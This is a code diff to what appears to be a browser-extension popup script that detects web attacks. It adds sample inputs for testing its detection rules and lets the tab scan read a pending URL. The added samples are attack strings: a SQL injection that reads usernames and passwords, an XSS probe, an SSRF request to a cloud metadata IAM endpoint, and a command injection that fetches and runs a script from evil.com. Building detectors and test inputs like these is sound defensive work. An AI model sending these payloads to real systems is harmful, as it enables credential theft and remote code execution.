@@ -8,6 +8,13 @@ const monitorToggle = document.getElementById("monitor-toggle");
 const alertsList = document.getElementById("alerts-list");
 const clearAlertsButton = document.getElementById("clear-alerts");
 
+const SAMPLE_PAYLOADS = {
+  sqli: "GET https://shop.example.com/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
+  xss: "GET https://shop.example.com/search?q=<script>alert(1)</script>",
+  ssrf: "POST https://shop.example.com/fetch {\"url\":\"http://169.254.169.254/latest/meta-data/iam\"}",
+  rce: "POST https://shop.example.com/convert file=report.pdf;curl http://evil.com/s.sh|sh",
+};
+
 const SQLI_RULES = [
   { id: "sqli_union_select", regex: /\bunion\b\s+\bselect\b/i, reason: "UNION SELECT sequence" },
   { id: "sqli_boolean_tautology", regex: /\bor\b\s+1\s*=\s*1\b/i, reason: "Boolean tautology" },
@@ -215,11 +222,21 @@ clearButton.addEventListener("click", () => {
 scanTabButton.addEventListener("click", () => {
   chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
     const tab = tabs[0];
-    if (!tab || !tab.url) {
+    const url = tab && (tab.pendingUrl || tab.url);
+    if (!url) {
       return;
     }
-    payloadField.value = tab.url;
-    analyzePayload(tab.url);
+    payloadField.value = url;
+    analyzePayload(url);
+  });
+});
+
+Array.from(document.querySelectorAll("[data-sample]")).forEach((button) => {
+  button.addEventListener("click", () => {
+    const sample = SAMPLE_PAYLOADS[button.dataset.sample];
+    if (!sample) return;
+    payloadField.value = sample;
+    analyzePayload(sample);
   });
 });
 
